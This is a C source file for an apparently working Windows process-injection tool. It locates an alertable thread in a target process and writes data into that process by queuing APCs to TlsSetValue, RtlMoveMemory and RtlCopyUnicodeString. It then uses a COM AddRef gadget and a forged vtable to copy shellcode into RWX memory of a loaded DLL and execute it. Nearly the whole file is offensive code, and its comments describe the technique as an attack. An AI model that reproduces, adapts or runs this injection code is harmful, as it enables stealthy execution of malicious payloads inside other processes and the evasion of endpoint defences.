#include        "defs.h"

WCHAR   g_rwxDll[MAX_PATH];
WCHAR   *g_rwxDllBaseName;

HANDLE          g_hThread;
PVOID           g_teb;
#ifdef _WIN64
ULONG_PTR       g_tls_offset = 0x1480;
#else
ULONG_PTR       g_tls_offset = 0xe10;
#endif

ULONG_PTR       g_tls_save_offset = 0;

VOID    WriteRemoteProcessMemory(PVOID dest, PVOID src, ULONG size){
        ULONG_PTR       size_aligned;
        ULONG_PTR       data_aligned, data_aligned_save;
        ULONG_PTR       d = (ULONG_PTR)dest;
        ULONG_PTR       copy_chunk, copy_chunk_tmp;
        ULONG           index;
        
        ULONG_PTR       fnTlsSetValue;
        ULONG_PTR       fnRtlMoveMemory;
        
        fnTlsSetValue          = (ULONG_PTR)GetProcAddress(LoadLibrary(L"kernel32.dll"), "TlsSetValue");
        fnRtlMoveMemory        = (ULONG_PTR)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlMoveMemory");
        
        size_aligned = (size + sizeof(ULONG_PTR)- 1) & -sizeof(ULONG_PTR);
        
        data_aligned_save = data_aligned = (ULONG_PTR)GlobalAlloc(GPTR, size_aligned);
        memcpy((PVOID)data_aligned, src, size);
        //we have 64 entries for TlsSetValue so use them properly...
                
        while(size_aligned){
                if (size_aligned >= 64 * sizeof(ULONG_PTR))
                        copy_chunk = 64 * sizeof(ULONG_PTR);
                else
                        copy_chunk = size_aligned;
                copy_chunk_tmp = copy_chunk;
        
                for (index = 0; index < copy_chunk/sizeof(ULONG_PTR); index++){
                        NtQueueApcThread(g_hThread,
                                         (PPS_APC_ROUTINE)fnTlsSetValue,
                                         (PVOID)(ULONG_PTR)(index),
                                         (PVOID)*(ULONG_PTR *)(data_aligned + index * sizeof(ULONG_PTR)),
                                         0);
                }
                
                NtQueueApcThread(g_hThread,
                                 (PPS_APC_ROUTINE)fnRtlMoveMemory,
                                 (PVOID)d,
                                 (PVOID)((ULONG_PTR)g_teb + g_tls_offset),
                                 (PVOID)copy_chunk);
                
                d += copy_chunk;
                data_aligned += copy_chunk;
                size_aligned -= copy_chunk;
                                        
        }        
        GlobalFree((PVOID)data_aligned_save);
        
}


VOID    WriteRemoteProcessMemoryPointer(PVOID dest, PVOID src, ULONG size){
        ULONG_PTR       fnTlsSetValue;
        ULONG_PTR       fnRtlCopyUnicodeString;
        ULONG_PTR       fnRtlMoveMemory;
        
        fnTlsSetValue          = (ULONG_PTR)GetProcAddress(LoadLibrary(L"kernel32.dll"), "TlsSetValue");
        fnRtlMoveMemory        = (ULONG_PTR)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlMoveMemory");
        fnRtlCopyUnicodeString = (ULONG_PTR)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlCopyUnicodeString");
        
        NtQueueApcThread(g_hThread,
                        (PPS_APC_ROUTINE)fnTlsSetValue,
                        (PVOID)0,
                        (PVOID)(ULONG_PTR)(size << 16 | size),
                        0);
        
        NtQueueApcThread(g_hThread,
                         (PPS_APC_ROUTINE)fnRtlMoveMemory,
                         (PVOID)((ULONG_PTR)g_teb + g_tls_offset + sizeof(ULONG_PTR)),
                         dest,
                         (PVOID)sizeof(ULONG_PTR));
        
        NtQueueApcThread(g_hThread,
                        (PPS_APC_ROUTINE)fnTlsSetValue,
                        (PVOID)2,
                        (PVOID)(ULONG_PTR)(size << 16 | size),
                        0);
        NtQueueApcThread(g_hThread,
                        (PPS_APC_ROUTINE)fnTlsSetValue,
                        (PVOID)3,
                        src,
                        0);
        NtQueueApcThread(g_hThread,
                         (PPS_APC_ROUTINE)fnRtlCopyUnicodeString,
                         (PVOID)((ULONG_PTR)g_teb + g_tls_offset),
                         (PVOID)((ULONG_PTR)g_teb + g_tls_offset + sizeof(UNICODE_STRING)),
                         0);
        
}

VOID    SaveTLS(){
        ULONG_PTR       fnRtlMoveMemory;
        
        fnRtlMoveMemory        = (ULONG_PTR)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlMoveMemory");
        NtQueueApcThread(g_hThread,
                         (PPS_APC_ROUTINE)fnRtlMoveMemory,
                         (PVOID)(g_tls_save_offset),
                         (PVOID)((ULONG_PTR)g_teb + g_tls_offset),
                         (PVOID)(64 * sizeof(ULONG_PTR)));     
}

VOID    RestoreTLS(){      
        ULONG_PTR       fnRtlMoveMemory;
        
        fnRtlMoveMemory        = (ULONG_PTR)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlMoveMemory");
        NtQueueApcThread(g_hThread,
                         (PPS_APC_ROUTINE)fnRtlMoveMemory,
                         (PVOID)((ULONG_PTR)g_teb + g_tls_offset),
                         (PVOID)(g_tls_save_offset),
                         (PVOID)(64 * sizeof(ULONG_PTR)));
       
}

ULONG_PTR       GetGoodDll(__in ULONG   dwSize){
        ULONG_PTR       imagebase[3];
        ULONG           index, jindex;
        PIMAGE_DOS_HEADER       pmz;
        #ifdef _WIN64
        PPEHEADER64             pe32;
        #else
        PPEHEADER32             pe32;
        #endif
        PSECTION_HEADER         psection;
        ULONG_PTR               write_offset = 0;
        
        imagebase[0] = (ULONG_PTR)GetModuleHandle(L"ntdll.dll");
        imagebase[1] = (ULONG_PTR)GetModuleHandle(L"kernel32.dll");
        imagebase[2] = (ULONG_PTR)GetModuleHandle(L"kernelbase.dll");
        
        for (index = 0; index < sizeof(imagebase)/sizeof(ULONG_PTR); index++){
                if (imagebase[index] == 0) continue;        
                pmz = (PIMAGE_DOS_HEADER)imagebase[index];
                #ifdef _WIN64
                pe32= (PPEHEADER64)(imagebase[index] + pmz->e_lfanew);
                #else
                pe32= (PPEHEADER32)(imagebase[index] + pmz->e_lfanew);
                #endif
                psection = (PSECTION_HEADER)((ULONG_PTR)pe32 + 4 + sizeof(IMAGE_FILE_HEADER) + pe32->pe_sizeofoptionalheader); 
                for (jindex = 0; jindex < pe32->pe_numberofsections; jindex++){
                        if (psection[jindex].sh_characteristics & IMAGE_SCN_MEM_WRITE){
                                if (psection[jindex].sh_virtualsize % 0x1000){
                                        if (dwSize <= 0x1000 - (psection[jindex].sh_virtualsize % 0x1000)){
                                                write_offset = psection[jindex].sh_virtualaddress + psection[jindex].sh_virtualsize + imagebase[index];                                        
                                                break;
                                        }        
                                }        
                                
                        }        
                }
                if (write_offset != 0) break;       
        }
                
        return write_offset;
}



//trick is quite simple we Queue APC to all threads which are not in DelayExecution state (NtDelayExecution)... I know 
//we can miss some... but attack only waiting threads except DelayExecution, and check which one has its state changed
//to DelayExecution... well not perfect but will do the job...
HANDLE  FindAlertableThread(__in WCHAR  *wsProcessName){
        PSYSTEM_PROCESS_INFORMATION     pspi, pspi_tmp;
        PSYSTEM_THREAD_INFORMATION      psti;
        DWORD                           dwThreadCount;
        HANDLE                          hThread;
        DWORD                           dwNeededSize;
        ULONG                           index, jindex;
        ULONG_PTR                       fnSleepEx;
        ULONG_PTR                       dwThreads[1024];
        NTSTATUS                        status;
        ULONG                           tindex = 0;
        OBJECT_ATTRIBUTES               oa;
        LARGE_INTEGER                   delay;
        ULONG                           dwSuspendCount;
        DWORD                           dwPid;
        
        dwPid = _wtoi(wsProcessName);
        
        memset(dwThreads, 0, sizeof(dwThreads));
        
        pspi = pspi_tmp = RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100000);
        NtQuerySystemInformation(SystemProcessInformation, pspi, 0x100000, &dwNeededSize);
        
        fnSleepEx = (ULONG_PTR)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "SleepEx");
        
        for (;;){
                if (pspi->ImageName.Length == 0 || pspi->ImageName.Buffer == NULL) goto __next_pid;
                if (dwPid != 0){
                        if ((DWORD)(ULONG_PTR)pspi->UniqueProcessId != dwPid) goto __next_pid;
                }else{
                        if (_wcsicmp(pspi->ImageName.Buffer, wsProcessName)) goto __next_pid;
                }
                         
                dwThreadCount = pspi->NumberOfThreads;
                psti = (PSYSTEM_THREAD_INFORMATION)((ULONG_PTR)pspi + sizeof(SYSTEM_PROCESS_INFORMATION));
                for (index = 0; index < dwThreadCount; index++){
                        if (psti[index].ThreadState == Waiting){
                                if (psti[index].WaitReason != DelayExecution){
                                        InitializeObjectAttributes(&oa, 0,0,0,0);
                                        status = NtOpenThread(&hThread, 
                                                              MAXIMUM_ALLOWED,
                                                              &oa,
                                                              &psti[index].ClientId);
                                        if (status != STATUS_SUCCESS) continue;
                                        status = NtQueueApcThread(hThread,
                                                                 (PPS_APC_ROUTINE)fnSleepEx,
                                                                 (PVOID)2000,
                                                                 (PVOID)TRUE,
                                                                 0);    
                                        NtClose(hThread);
                                        if (status == STATUS_SUCCESS){
                                                dwThreads[tindex] = (DWORD)(ULONG_PTR)psti[index].ClientId.UniqueThread;
                                                tindex++;
                                        }                            
                                }        
                        }                
                }     
__next_pid:     if (pspi->NextEntryOffset == 0) break;
                pspi = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pspi + pspi->NextEntryOffset);
                        
        }   
        hThread = NULL;
        delay.QuadPart = RELATIVE(MILLISECONDS(500));
        NtDelayExecution(FALSE, &delay);

        pspi = pspi_tmp;
        NtQuerySystemInformation(SystemProcessInformation, pspi, 0x100000, &dwNeededSize);
        //here we go again...                    
        for (;;){
                if (pspi->ImageName.Length == 0 || pspi->ImageName.Buffer == NULL) goto __next_pid1;
                if (dwPid != 0){
                        if ((DWORD)(ULONG_PTR)pspi->UniqueProcessId != dwPid) goto __next_pid1;
                }else{
                        if (_wcsicmp(pspi->ImageName.Buffer, wsProcessName)) goto __next_pid1;
                }
                         
                dwThreadCount = pspi->NumberOfThreads;
                psti = (PSYSTEM_THREAD_INFORMATION)((ULONG_PTR)pspi + sizeof(SYSTEM_PROCESS_INFORMATION));
                for (index = 0; index < dwThreadCount; index++){
                        if (psti[index].ThreadState == Waiting){
                                if (psti[index].WaitReason == DelayExecution){
                                        for (jindex = 0; jindex < tindex; jindex++){
                                                if (dwThreads[jindex] == (DWORD)(ULONG_PTR)psti[index].ClientId.UniqueThread){
                                                        InitializeObjectAttributes(&oa, 0,0,0,0);
                                                        status = NtOpenThread(&hThread, 
                                                                              MAXIMUM_ALLOWED,
                                                                              &oa,
                                                                              &psti[index].ClientId);
                                                        if (status != STATUS_SUCCESS) continue;
                                                        
                                                        NtQueueApcThread(hThread,
                                                                         (PPS_APC_ROUTINE)fnSleepEx,
                                                                         (PVOID)100000,
                                                                         (PVOID)TRUE,
                                                                         0);
                                                        NtSuspendThread(hThread, &dwSuspendCount);
                                                        delay.QuadPart = RELATIVE(SECONDS(1));
                                                        NtDelayExecution(FALSE, &delay);
                                                        goto __Exit0;
                                                }        
                                        }                           
                                }        
                        }                
                }     
__next_pid1:     if (pspi->NextEntryOffset == 0) break;
                pspi = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pspi + pspi->NextEntryOffset);
                        
        }        
__Exit0:
        RtlFreeHeap(GetProcessHeap(), 0, pspi_tmp);        
        return hThread;
}

int __cdecl wmain(int argc, wchar_t **argv){ 
        PIMAGE_DOS_HEADER       pmz;
        #ifdef _WIN64
        PPEHEADER64             pe32;
        #else
        PPEHEADER32             pe32;
        #endif
        PSECTION_HEADER         psection;
        ULONG_PTR               rwxdllbase;
        ULONG                   index;
        ULONG_PTR               write_offset           = 0;
        ULONG_PTR               rwx_offset             = 0;
        ULONG_PTR               getmodulehandle_offset = 0;
        ULONG_PTR               shellcode_offset       = 0;

        PVOID                   shellcode;
        DWORD                   shellcode_len;
        ULONG                   dwNeededSize;
        HANDLE                  hThread;
        THREAD_BASIC_INFORMATION        tbi;
        DWORD                   dwSuspendCount;
        
        IClassFactory           *pClassFactory = NULL;
        DLLGETCLASSOBJECT       fnDllGetClassObject;
        HMODULE                 ole32;
        PLDR_DATA_TABLE_ENTRY   pLdrDataTableEntry;
        
        ULONG_PTR               pClassFactoryDllBase;
        WCHAR                   wsClassFactoryDllName[MAX_PATH];
        
        ULONG                   rwxDllLen;
        
        //contrary to x32 where we use QueryInterface to trigger execution, on x64 there are no
        //InterlockedExchangeAdd apis thus all additions can be achived through COM via AddRef
        //maybe there are some better apis but who cares... In a nutshell here is how ClassFactory
        //AddRef looks like:
        //
        //.text:00000001800165A0                                         ; .rdata:const CNotifyCP::`vftable'o ...
        //.text:00000001800165A0                 mov     eax, 1
        //.text:00000001800165A5                 lock xadd [rcx+8], eax
        //.text:00000001800165AA                 inc     eax
        //.text:00000001800165AC                 retn
        //    
        // With this we can increment any pointer we like in remote process...    
        CoInitialize(NULL);

        ole32 = LoadLibrary(L"ole32.dll");
        fnDllGetClassObject = (DLLGETCLASSOBJECT)GetProcAddress(ole32, "DllGetClassObject");
        fnDllGetClassObject(&CLSID_ComActivator, &IID_IClassFactory, &pClassFactory);
        
        LdrFindEntryForAddress(pClassFactory->lpVtbl->QueryInterface, &pLdrDataTableEntry);
        
        pClassFactoryDllBase = (ULONG_PTR)pLdrDataTableEntry->DllBase;
        memset(wsClassFactoryDllName, 0, sizeof(wsClassFactoryDllName));
        memcpy(wsClassFactoryDllName, pLdrDataTableEntry->BaseDllName.Buffer, pLdrDataTableEntry->BaseDllName.Length);
                                
        if (argc == 2){
                hThread = FindAlertableThread(argv[1]);
        }else{
                printf("[X] Missing process name or pid...\n");
                return 1;
        }       
        if (hThread == NULL){
                printf("[X] Failed to find alertable thread... meeh...\n");
                return 1;
        }
        
        NtQueryInformationThread(hThread, ThreadBasicInformation, &tbi, sizeof(tbi), &dwNeededSize);
        
        g_teb = tbi.TebBaseAddress;
        
        printf("[*] Alertable thread     : %d\n", (DWORD)(ULONG_PTR)tbi.ClientId.UniqueThread);

        shellcode = ExportShellcode(&shellcode_len);
        printf("[*] Shellcode len        : %d\n", shellcode_len);
        
        shellcode = RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, shellcode_len);
        memcpy(shellcode, ExportShellcode(&shellcode_len), shellcode_len);
             
        if (!FindRWXImage(g_rwxDll)){
                printf("[X] Failed to find image with RWX...\n");
                return 1;
        }
        
        g_rwxDllBaseName = wcsrchr(g_rwxDll, '\\');
        g_rwxDllBaseName++;
        
        printf("[*] Found rwx dll at     : %S\n", g_rwxDll);
        
        rwxDllLen = (ULONG)(wcslen(g_rwxDll) * sizeof(WCHAR) + sizeof(WCHAR));
        
        dwNeededSize = rwxDllLen; 
        dwNeededSize = (dwNeededSize + sizeof(ULONG_PTR) - 1) & -(ULONG_PTR)(sizeof(ULONG_PTR));
        dwNeededSize += sizeof(ULONG_PTR);              //where we will do getmodulehandleex
        dwNeededSize = 64 * sizeof(ULONG_PTR);
        dwNeededSize += shellcode_len;
        
        write_offset = GetGoodDll(dwNeededSize);
        if (write_offset == 0){
                printf("[X] Failed to get valid write offset...\n");
                return 1;
        }
        
        printf("[*] Found write offset at: %p\n", write_offset);
        
        rwxdllbase = (ULONG_PTR)LoadLibrary(g_rwxDll);
        pmz = (PIMAGE_DOS_HEADER)rwxdllbase;
        #ifdef _WIN64
        pe32= (PPEHEADER64)(rwxdllbase + pmz->e_lfanew);
        #else
        pe32= (PPEHEADER32)(rwxdllbase + pmz->e_lfanew);
        #endif
        
        psection = (PSECTION_HEADER)((ULONG_PTR)pe32 + 4 + sizeof(IMAGE_FILE_HEADER) + pe32->pe_sizeofoptionalheader);
        for (index = 0; index < pe32->pe_numberofsections; index++){
                if ((psection[index].sh_characteristics & 0xF0000000) == (IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE)){
                        if (psection[index].sh_virtualsize % 0x1000){
                                rwx_offset = psection[index].sh_virtualaddress;
                                printf("[*] Found rwx offset at  : %p\n", rwx_offset); 
                                break;                              
                        }        
                }         
        }
                                

        //where we will be writing... here we can use RtlCopyUnicodeString to copy what we want, where 
        //we want...
        getmodulehandle_offset = write_offset + wcslen(g_rwxDll) * sizeof(WCHAR) + sizeof(WCHAR);

        getmodulehandle_offset = (getmodulehandle_offset + sizeof(ULONG_PTR)-1) & -sizeof(ULONG_PTR);
        g_tls_save_offset      = getmodulehandle_offset + sizeof(ULONG_PTR);
        shellcode_offset       = getmodulehandle_offset + sizeof(ULONG_PTR) + 64 * sizeof(ULONG_PTR);

        g_hThread              =  hThread;       
       
        SaveTLS();
       
        WriteRemoteProcessMemory((PVOID)write_offset, g_rwxDll, rwxDllLen);
        
        //load image into remote process...
        NtQueueApcThread(hThread,
                         (PPS_APC_ROUTINE)GetProcAddress(LoadLibrary(L"kernel32.dll"), "LoadLibraryW"),
                         (PVOID)write_offset,
                         0,
                         0);
        
        NtQueueApcThread(hThread,
                        (PPS_APC_ROUTINE)GetProcAddress(LoadLibrary(L"kernel32.dll"), "GetModuleHandleExW"),
                        0,
                        (PVOID)write_offset,
                        (PVOID)getmodulehandle_offset);
        
        //load ole32.dll (probably that's the one with CDefClassFactory... eg... dll which we got at the beginning...)
        WriteRemoteProcessMemory((PVOID)write_offset, wsClassFactoryDllName, (ULONG)(wcslen(wsClassFactoryDllName) * sizeof(WCHAR) + sizeof(WCHAR)));
        NtQueueApcThread(hThread,
                         (PPS_APC_ROUTINE)GetProcAddress(LoadLibrary(L"kernel32.dll"), "LoadLibraryW"),
                         (PVOID)write_offset,
                         0,
                         0);
        
        //increment pointer thus we are pointing to RWX memory in .net cache image...
        //we can increment at 2nd byte as due to image alignment we know that last
        //byte is not used, eg. it will be 0... 
        
        //ptr is 0x7FFFxxx000
        //we are incrementing 0x7FFFxxx0 to reduce number of delivered APCs...
        for (index = 0; index < rwx_offset >> 8; index++){
                NtQueueApcThread(hThread,
                                 (PPS_APC_ROUTINE)pClassFactory->lpVtbl->AddRef,
                                 (PVOID)(getmodulehandle_offset - sizeof(ULONG_PTR) + 1),
                                 0,
                                 0);
        }
        
        //good, now we need to copy shellcode into remote process...
        WriteRemoteProcessMemory((PVOID)shellcode_offset, shellcode, shellcode_len);
        
        //now we need to copy shellcode to RWX memory, this is simply achived by using RtlCopyUnicodeString...
        //for this we can use TlS offsets to build 2 valid unicode strings...
        WriteRemoteProcessMemoryPointer((PVOID)getmodulehandle_offset, (PVOID)shellcode_offset, shellcode_len);
        
        
        //and now we need to trigger execution... we kinda know where is pointer... so create fake lpVtbl and 
        //call QueryInterface
        
        //Write GUID to memory as we will pass it to QueryInterface
        WriteRemoteProcessMemory((PVOID)write_offset, (PVOID)&IID_IClassFactory, sizeof(GUID));
        //make valid lpVtbl...
        //system.dll!0x1000 [system.dll!0x1000]     <--- this->lpVtbl where AddRef is at system.dll!0x1008
        //system.dll!0x1008 [PTR_TO_RWX_MEM]        <--- will be triggered by lpVtbl->AddRef call...
        getmodulehandle_offset -= sizeof(ULONG_PTR);    //<--- to make proper lpVtbl...
        WriteRemoteProcessMemory((PVOID)getmodulehandle_offset, &getmodulehandle_offset, sizeof(getmodulehandle_offset));

        //restore TLS...
        RestoreTLS();
        
        //and trigger pClassFactory->lpVtbl->QueryInterface(system.dll!0x1000, ptr to IClassFactory, someptrwecanwriteto)
        NtQueueApcThread(hThread,
                         (PPS_APC_ROUTINE)pClassFactory->lpVtbl->QueryInterface,
                         (PVOID)(getmodulehandle_offset),
                         (PVOID)(write_offset),
                         (PVOID)(write_offset + sizeof(GUID))); 
        
        NtResumeThread(hThread, &dwSuspendCount);
         
        printf("[*] Done...\n");
        CoUninitialize();
        
}